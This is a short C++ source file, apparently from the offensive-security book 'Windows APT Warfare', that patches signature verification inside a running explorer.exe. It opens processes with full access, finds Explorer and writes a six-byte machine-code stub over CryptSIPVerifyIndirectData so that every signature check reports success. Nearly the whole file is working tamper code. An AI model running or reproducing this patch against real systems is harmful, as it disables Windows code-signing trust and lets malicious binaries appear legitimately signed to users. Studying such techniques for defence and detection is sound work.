/* signVerifyBypass.cpp
 * > Signature Patcher for Explorer
 *
 * Windows APT Warfare
 * by aaaddress1@chroot.org
 */
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#pragma comment(lib, "psapi.lib")
#pragma warning(disable:4996)

bool patchedDone = false;
char tmpModName[MAX_PATH], *pfnCryptVerifyData;
/* 32bit mode
 *     +0x00 - 48       - dec eax
 *     +0x01 - 31 C0    - xor eax, eax
 *     +0x03 - FE C0    - inc  al
 *     +0x05 - C3       - ret
 * 64bit mode
 *     +0x00 - 48 31 C0 - xor rax, rax
 *     +0x03 - FE C0    - inc al
 *     +0x05 - C3       - ret
 */
char x96payload[] = { "\x48\x31\xC0\xFE\xC0\xC3" };
int main() {
	pfnCryptVerifyData = (PCHAR)GetProcAddress(LoadLibraryA("Crypt32"), "CryptSIPVerifyIndirectData");
	EnumWindows([](HWND hWnd, LPARAM lParam) -> BOOL {
		DWORD processId;
		GetWindowThreadProcessId(hWnd, &processId);
		if (HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId)) {
			GetModuleFileNameExA(hProc, NULL, tmpModName, sizeof(tmpModName));
			if (!stricmp(tmpModName, "C:\\Windows\\explorer.exe"))
				patchedDone |= WriteProcessMemory(hProc, pfnCryptVerifyData, x96payload, sizeof(x96payload), NULL);
		}
		return true;
	}, 0);
	puts(patchedDone ? "[+] Sign Verify Patch for Explorer.exe Done." : "[!] Explorer.exe Alive yet?");
	return 0;
}